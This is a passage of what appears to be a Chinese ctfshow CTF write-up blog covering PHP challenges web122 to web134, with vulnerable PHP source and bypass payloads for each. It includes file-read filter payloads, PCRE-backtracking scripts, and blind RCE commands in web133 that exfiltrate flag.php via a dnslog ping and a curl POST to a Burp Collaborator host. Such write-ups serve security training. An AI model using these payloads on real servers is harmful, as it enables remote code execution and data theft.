class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="number">128</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$payload</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>).PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°<code>%0C</code>ï¼Œä¹Ÿå°±æ˜¯<code>\f</code>åˆ†é¡µç¬¦å¯ä»¥åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?num=%0C36</span><br></pre></td></tr></table></figure><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰<code>ç©ºæ ¼ã€+ã€[</code>åˆ™ä¼šè¢«è½¬åŒ–ä¸º<code>_</code>ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡º<code>CTF_SHOW.COM</code>è¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰<code>.</code>)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥<code>[</code>ï¼Œå®ƒè¢«è½¬åŒ–ä¸º<code>_</code>ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POSTï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</span><br></pre></td></tr></table></figure><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?1=flag.php</span><br><span class="line">POSTï¼šCTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><h3 id="web126"><a href="#web126" class="headerlink" title="*web126"></a>*web126</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line"></span><br><span class="line">/?$fl0g=flag_give_me;</span><br><span class="line">POSTï¼šCTF_SHOW=$flag&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼ã€<code>+</code>ã€<code>[</code>ä¼šè¢«è½¬åŒ–ä¸º<code>_</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctf show=ilove36d</span><br></pre></td></tr></table></figure><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>_()</strong> ç­‰æ•ˆäº <strong>gettext()</strong></p><p><strong>get_defined_vars ( void ) : array</strong> å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=/ctfshow/../var/www/html/flag.php</span><br><span class="line">/?f=http://url/xxxx.txt?ctfshow #è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šå†™ğŸ</span><br><span class="line">/?f=php://filter/ctfshow/resource=flag.php</span><br><span class="line">/?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php</span><br><span class="line">/?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥<code>ctfshow</code>æˆ–è€…åˆ©ç”¨æ•°ç»„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: f=ctfshow</span><br><span class="line">POST: f[]=1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯ï¼ˆ<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a>ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e393df7-54a9-43aa-b855-c2d9ffb0d6bc.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span> + <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™æœ€å¤§å›æº¯å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e9ba2cd0-88f6-418c-891a-bba82431675b.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span> + <span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>è®¿é—®<code>/robots.txt</code> å‘ç°<code>/admin</code>ï¼Œè®¿é—®åå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpè¿ç®—ç¬¦ä¼˜å…ˆçº§ <code>||</code>ä¼˜å…ˆçº§ä½äº<code>&amp;&amp;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin?username=admin&amp;password=&amp;code=admin</span><br></pre></td></tr></table></figure><h3 id="web133"><a href="#web133" class="headerlink" title="*web133"></a>*web133</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/miuzzx/article/details/109197158?spm=1001.2014.3001.5502">åŸç†è§£æ</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getä¼ å‚   F=`$F `;sleep 3</span><br><span class="line">ç»è¿‡substr($F,0,6)æˆªå–å å¾—åˆ°  `$F `;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ eval(&quot;`$F `;&quot;);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»</span><br><span class="line">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† sleep 3</span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†</span><br></pre></td></tr></table></figure><h4 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h4><p>åœ¨<a href="http://dnslog.cn/">dnslog</a>è·å–åœ°å€<code>2553i2.dnslog.cn</code>ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.2553i2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ·æ–°è·å¾—å­—ç¬¦ä¸²ï¼Œç„¶åå¯¹å‰é¢çš„å­—ç¬¦ç¨ä½œå¤„ç†å³å¯ï¼ˆå»é™¤å¼€å¤´<code>flag</code>ï¼ŒåŠ ä¸Šæ‹¬å·ï¼Œä¸­é—´æŒ‰ç…§<code>uid</code>æ ¼å¼8-4-4-4-12æ·»åŠ <code>-</code>åˆ†å‰²å³å¯ï¼‰</p><p><a href="https://img.gejiba.com/image/Ebjw1q"><img src="https://img.gejiba.com/images/18ef283bd3da16f381721534b8057a4f.png" alt="18ef283bd3da16f381721534b8057a4f.png"></a></p><h4 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h4><p>é¦–å…ˆï¼Œæ‰“å¼€<code>burpsuite</code>é‡Œçš„<code>Collaborator Client</code></p><p><a href="https://img.gejiba.com/image/EbjqQS"><img src="https://img.gejiba.com/images/1fd6303970f34fa5958ad60ab94d49ad.jpg" alt="1fd6303970f34fa5958ad60ab94d49ad.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?F=`$F `;curl -X POST -F evo=@flag.php zdg64jrwcfs1whzlm8ytol9nkeq5eu.burpcollaborator.net</span><br></pre></td></tr></table></figure><p><a href="https://img.gejiba.com/image/EbjtkT"><img src="https://img.gejiba.com/images/165091d5e5f82d90b329ae7a3cea150e.png" alt="165091d5e5f82d90b329ae7a3cea150e.png"></a></p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span 